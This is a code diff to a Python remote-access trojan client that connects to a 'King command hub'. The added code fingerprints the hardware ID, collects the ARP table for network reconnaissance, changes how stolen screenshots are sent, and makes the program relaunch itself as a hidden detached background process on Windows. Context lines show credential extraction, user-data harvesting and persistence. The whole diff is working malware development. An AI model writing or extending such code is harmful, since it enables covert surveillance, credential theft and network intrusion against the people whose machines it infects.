@@ -12,6 +12,25 @@ import winreg
 import threading
 import subprocess
 import random
+import uuid
+
+def get_hwid():
+    return "-".join(["{:02x}".format((uuid.getnode() >> i) & 0xff) for i in range(0, 48, 8)][::-1]).upper()
+
+def get_arp_table():
+    try:
+        output = subprocess.check_output("arp -a", shell=True).decode('utf-8', errors='ignore')
+        return output
+    except Exception as e:
+        return f"Failed to get ARP table: {e}"
+
+def run_detached():
+    if platform.system() == 'Windows':
+        # Re-run the script with --detached flag to avoid recursion
+        cmd = [sys.executable, sys.argv[0]] + sys.argv[1:] + ["--detached"]
+        subprocess.Popen(cmd, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
+        sys.exit(0)
+
 try:
     from mss import mss
     MSS_AVAILABLE = True
@@ -215,8 +234,9 @@ def capture_desktop_screenshot(client: socket.socket) -> None:
             image.save(jpg_buffer, format='JPEG', quality=60, optimize=True)
             jpg_data = jpg_buffer.getvalue()
             
-            # Send compressed JPEG data with explicit header
-            header = f"IMG_START|{len(jpg_data)}|\n".encode('utf-8')
+            # Send compressed JPEG data with 10-byte fixed-length header
+            client.sendall(b"IMG_FIXED\n")
+            header = f"{len(jpg_data):010d}".encode('utf-8')
             client.sendall(header + jpg_data)
             print(f"[+] Desktop screenshot captured and sent ({len(jpg_data)} bytes)")
     except Exception as e:
@@ -378,6 +398,7 @@ def get_username() -> str:
 
 def report_status() -> str:
     info = {
+        'HWID': get_hwid(),
         'OS': platform.system(),
         'Version': platform.version(),
         'Hostname': socket.gethostname(),
@@ -547,6 +568,13 @@ def connect_to_hub(hub_ip: str, port: int) -> None:
                             client.sendall(json_report.encode())
                         except Exception as e:
                             print(f"[-] HARVEST_USER failed: {e}")
+                    elif command == 'NETWORK_TOPOLOGY':
+                        try:
+                            arp_table = get_arp_table()
+                            client.send(f"TOPOLOGY_SIZE {len(arp_table)}\n".encode())
+                            client.sendall(arp_table.encode())
+                        except Exception as e:
+                            print(f"[-] NETWORK_TOPOLOGY failed: {e}")
                     elif command == 'EXTRACT_CREDENTIALS':
                         if not SQLITE_AVAILABLE or not CRYPTO_AVAILABLE:
                             client.sendall(b"DEPENDENCY_MISSING: sqlite3 pycryptodome\n")
@@ -640,10 +668,15 @@ def parse_args():
     parser.add_argument('--hub-ip', default=os.getenv('KING_HUB_IP', '192.168.100.9'), help='IP address of the King command hub')
     parser.add_argument('--hub-port', type=int, default=int(os.getenv('KING_HUB_PORT', '9999')), help='Port of the King command hub')
     parser.add_argument('--no-persist', action='store_true', help='Do not establish persistence (for testing)')
+    parser.add_argument('--detached', action='store_true', help='Run in background')
     return parser.parse_args()
 
 if __name__ == '__main__':
     args = parse_args()
+
+    if not args.detached:
+        print("[*] Transitioning to detached background process...")
+        run_detached()
 
     # Initialize Persistence FIRST unless testing without persistence
     if not args.no_persist:
